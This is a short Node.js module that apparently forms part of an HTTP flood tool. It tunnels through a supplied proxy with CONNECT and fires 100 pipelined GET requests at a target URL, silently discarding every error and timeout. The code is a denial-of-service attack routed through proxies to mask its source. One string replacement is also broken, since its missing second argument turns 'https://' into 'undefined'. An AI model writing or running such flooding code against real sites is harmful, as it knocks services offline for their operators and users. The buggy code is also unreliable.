module.exports.start = (function (url, proxy){
    try {
      const net = require('net')
        url = url.replace("http://", "").replace("https://").replace("www.", "")
        let mainUrl = url.split('/')[0];          
        let proxy_IP = proxy.split(':')[0];
        let proxy_PORT = proxy.split(':')[1];
          var socket = net.connect(proxy_PORT, proxy_IP, function() {
            socket.write(`CONNECT ${mainUrl} HTTP/1.1\r\n Host: ${mainUrl} \r\n\r\n`)
            for(let i = 0; i < 100; i++)
            {
              socket.write('GET /' + url.split('/')[1] + ' HTTP/1.1\r\n' +'Host: ' + mainUrl + '\r\n' +'\r\n');
            }
            socket.on('error', function (params) {
              //console.log("error")
            })
            socket.on('connect_error', function (params) {})
            socket.on('connect_failed', function (params) {})
            socket.on('ETIMEDOUT', function (params) {})
            socket.on('timeout', function (params) {})
            socket.on('emfile', function (params) {})
          });
          
         
    }
    catch(err)
    {
    }
})